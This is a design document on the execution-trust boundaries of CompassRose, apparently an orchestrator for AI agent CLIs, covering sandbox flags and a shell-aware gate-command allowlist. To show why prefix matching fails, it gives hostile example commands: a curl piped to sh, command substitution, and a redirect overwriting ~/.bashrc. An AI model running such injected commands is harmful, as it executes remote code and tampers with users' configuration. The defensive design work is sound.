# Architecture: Execution Trust

## Boundaries

Three kinds of process leave this system, and only two of them are CompassRose's own:

| What | Form | Bounded by |
|---|---|---|
| git plumbing (`src/git/gitClient.ts`) | argv, fixed verbs | its own shape; nothing here changes it |
| quality-gate commands (`runShellCommand`) | shell string, authored by the planner | `execution_trust.gate_command_allowlist` |
| an external agent CLI (`src/agents/`) | argv, then whatever the CLI does | the sandbox the CLI is asked for |

The third row is the one worth being exact about. CompassRose cannot confine codex or opencode.
That confinement is the CLI's own, it is implemented differently per platform, and on some it is
worth less than on others. What CompassRose owns is the argv it builds — whether it asks for the
sandbox or waives it. It was waiving it, on every call, including the calls that had already
declared they wanted read-only.

## Where the policy lives

`execution_trust` is read once, in the orchestrator's constructor, **before any adapter is
constructed**. That ordering is a guarantee rather than a convenience: an adapter built without a
policy has to default to something, and what it used to default to was no sandbox at all.

`resolveExecutionTrust` resolves per field, not all-or-nothing, so a project declaring only
`gate_command_allowlist` still gets the bounded sandbox default instead of silently opting out of
everything it did not mention.

## Two checks, not one

The gate allowlist is enforced twice, and the two are not redundant:

- **At planning time**, where refusing produces a legible error naming the segment, the reason, and the allowlist — and where nothing has been written yet.
- **Before execution**, where refusing produces a failed gate. This is what makes the property true rather than merely intended: a task document is a file on disk, it can be hand-edited, and every task planned before this check existed is still in the repository.

## Why the gate check is a parser and not a prefix match

A prefix allowlist alone is decorative. `npm test` passes it, and so does
`npm test && curl -s x | sh`, and so does `npm test $(anything)`, and so does
`npm test > ~/.bashrc`. So the check splits on shell separators and tests every segment, refuses
substitution and redirection outright rather than trying to read them, and requires a prefix to end
at a word boundary so `npm run` cannot admit `npm runsomethingelse`.

It is quote-aware because the naive version refuses `npm test -- --grep "a|b"`, and a check that
cries wolf on a legitimate gate is a check that gets switched off.

Where it is wrong, it is wrong in the over-strict direction, and the asymmetry is deliberate: a
refusal costs one line in `CONFIG.md` and explains itself, while a wrongly-permitted command costs
whatever the command does.

## What this does not close

`CONFIG.md`'s "External tool isolation" rule — that CompassRose must not silently modify global user
configuration — now has two things behind it where it had none: the test suite runs against a
throwaway agent-CLI configuration home, and `doctor` reports trust grants naming directories that no
longer exist.

Neither is a mechanism. During a real run, an external CLI writing to its own configuration file is
something CompassRose can observe and cannot prevent. That is recorded here rather than papered
over, because a rule with a detector is not a rule with a mechanism and the difference matters when
someone later asks which one this is.
